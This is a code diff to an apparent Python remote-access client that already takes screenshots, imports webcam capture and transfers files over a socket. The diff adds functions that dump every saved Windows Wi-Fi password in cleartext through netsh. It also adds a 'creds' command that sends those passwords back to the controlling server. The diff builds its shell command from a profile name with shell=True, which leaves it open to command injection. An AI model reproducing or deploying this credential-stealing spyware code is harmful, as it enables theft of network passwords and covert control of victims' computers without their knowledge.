@@ -12,6 +12,42 @@ from cv2 import *
 from cv2 import VideoCapture
 from cv2 import imwrite
 import time
+import re
+
+def get_wifi_profiles():
+    try:
+        result = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True, shell=True)
+        return result.stdout
+    except subprocess.CalledProcessError as e:
+        print(f"Error occurred: {e}")
+        return ""
+
+def extract_profile_names(output):
+    profile_names = re.findall(r": (.*)", output)
+    return profile_names
+
+def get_wifi_password(profile_name):
+    try:
+        command = f'netsh wlan show profile name="{profile_name}" key=clear'
+        result = subprocess.run(command, capture_output=True, text=True, shell=True)
+        if result.returncode != 0:
+            return None
+        password = re.findall(r"Key Content\s*: (.*)", result.stdout)
+        return password[0].strip() if password else None
+    except subprocess.CalledProcessError as e:
+        print(f"Error occurred: {e}")
+        return None
+
+def enumerate_wifi_passwords():
+    wifi_profiles = get_wifi_profiles()
+    profile_names = extract_profile_names(wifi_profiles)
+
+    wifi_passwords = {}
+    for profile_name in profile_names:
+        password = get_wifi_password(profile_name.strip())
+        wifi_passwords[profile_name.strip()] = password
+
+    return wifi_passwords
 
 def take_screenshot():
     img = ImageGrab.grab()
@@ -152,6 +188,10 @@ def main():
                     receive_file(client_socket, file_path)
                 except ValueError:
                     print("Please enter the file path after 'file' command.")
+            elif command == "creds":
+                wifi_passwords = enumerate_wifi_passwords()
+                password_data = "\n".join([f"Wi-Fi Name: {profile_name}, Password: {password}" for profile_name, password in wifi_passwords.items()])
+                client_socket.sendall(password_data.encode('utf-8'))
             elif command == "exit":
                 break
             else:
@@ -159,7 +199,10 @@ def main():
 
     except Exception as e:
         print(f"Error occurred - {e}")
-
+    except (ConnectionResetError, KeyboardInterrupt):
+        print("Disconnecting from the server.")
+        client_socket.close()
+        sys.exit(0)
     print("Connection closed.")
     client_socket.close()
 
